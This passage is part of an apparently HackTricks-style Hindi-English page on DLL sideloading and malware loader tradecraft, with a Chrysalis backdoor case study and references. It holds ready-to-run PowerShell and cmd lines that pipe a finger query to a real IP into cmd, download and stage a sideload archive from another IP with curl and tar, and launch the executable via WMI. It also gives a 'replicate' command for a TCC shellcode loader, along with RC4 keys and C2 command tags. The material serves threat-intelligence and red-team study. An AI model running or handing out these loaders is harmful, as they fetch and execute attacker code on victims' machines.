- **Remote command loader (Finger):** Hidden PowerShell `cmd.exe /c` spawn करता है, Finger सर्वर से कमांड खींचता है, और उन्हें `cmd` को pipe कर देता है:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` TCP/79 पर टेक्स्ट खींचता है; `| cmd` सर्वर की response को execute कर देता है, जिससे operators दूसरी स्टेज सर्वर-साइड rotate कर सकते हैं।

- **Built-in download/extract:** एक benign extension वाली archive डाउनलोड करें, उसे unpack करें, और sideload target तथा DLL को एक random `%LocalAppData%` फ़ोल्डर के अंदर stage करें:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` progress छुपाता है और redirects को follow करता है; `tar -xf` Windows के built-in tar का उपयोग करता है।

- **WMI/CIM launch:** EXE को WMI के माध्यम से शुरू करें ताकि telemetry में एक CIM-created process दिखे जबकि यह colocated DLL लोड कर रहा हो:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- यह उन बाइनरीज़ के साथ काम करता है जो local DLLs को प्राथमिकता देती हैं (उदा., `intelbq.exe`, `nearby_share.exe`); payload (उदा., Remcos) trusted नाम के तहत चलता है।

- **Hunting:** `forfiles` पर अलर्ट डालें जब `/p`, `/m`, और `/c` एक साथ दिखाई दें; admin scripts के बाहर यह दुर्लभ होता है।

## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

हालिया Lotus Blossom intrusion ने एक trusted update chain का दुरुपयोग करके NSIS-packed dropper डिलीवर किया जिसने DLL sideload के साथ-साथ पूरी तरह in-memory payloads स्टेज किए।

Tradecraft flow
- `update.exe` (NSIS) `%AppData%\Bluetooth` बनाता है, इसे **HIDDEN** mark करता है, एक renamed Bitdefender Submission Wizard `BluetoothService.exe`, एक malicious `log.dll`, और एक encrypted blob `BluetoothService` drop करता है, फिर EXE लॉन्च करता है।
- Host EXE `log.dll` import करता है और `LogInit`/`LogWrite` कॉल करता है। `LogInit` blob को mmap-load करता है; `LogWrite` इसे custom LCG-based stream से decrypt करता है (constants **0x19660D** / **0x3C6EF35F**, key material पूर्व hash से derived), buffer को plaintext shellcode से overwrite करता है, temps free करता है, और उस पर jump करता है।
- IAT से बचने के लिए loader export names को hash करके APIs resolve करता है using **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, फिर एक Murmur-style avalanche (**0x85EBCA6B**) लागू करके salted target hashes से तुलना करता है।

Main shellcode (Chrysalis)
- एक PE-like main module को पांच पास में add/XOR/sub दोहराकर key `gQ2JR&9;` से decrypt करता है, फिर dynamically `Kernel32.dll` → `GetProcAddress` लोड करके import resolution पूरा करता है।
- Runtime पर per-character bit-rotate/XOR transforms के जरिए DLL name strings पुनर्निर्मित करता है, फिर `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` लोड करता है।
- एक दूसरा resolver उपयोग करता है जो **PEB → InMemoryOrderModuleList** को चलकर हर export table को 4-byte blocks में Murmur-style mixing से parse करता है, और hash न मिलने पर ही `GetProcAddress` पर fallback होता है।

Embedded configuration & C2
- Config गिराई गयी `BluetoothService` फाइल के अंदर **offset 0x30808** (size **0x980**) पर रहता है और key `qwhvb^435h&*7` से RC4-decrypt होता है, जिससे C2 URL और User-Agent का खुलासा होता है।
- Beacons dot-delimited host profile बनाते हैं, tag `4Q` जोड़ते हैं, फिर HTTPS पर `HttpSendRequestA` से पहले key `vAuig34%^325hGV` से RC4-encrypt करते हैं। Responses को RC4-decrypt किया जाता है और tag switch द्वारा dispatch किया जाता है (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases)।
- Execution mode CLI args से नियंत्रित होता है: no args = install persistence (service/Run key) जो `-i` की ओर इशारा करता है; `-i` अपने आप को `-k` के साथ relaunch करता है; `-k` install skip करके payload चलाता है।

Alternate loader observed
- उसी intrusion ने Tiny C Compiler drop किया और `C:\ProgramData\USOShared\` से `svchost.exe -nostdlib -run conf.c` execute किया, जिसमें `libtcc.dll` पास में था। attacker-supplied C source में embedded shellcode था, जिसे compile करके बिना disk को स्पर्श किए PE के बिना memory में चलाया गया। Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- यह TCC-based compile-and-run stage ने runtime पर `Wininet.dll` को import किया और एक hardcoded URL से second-stage shellcode को प्राप्त किया, जिससे एक flexible loader बनता है जो एक compiler run के रूप में छद्मवेश करता है।

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
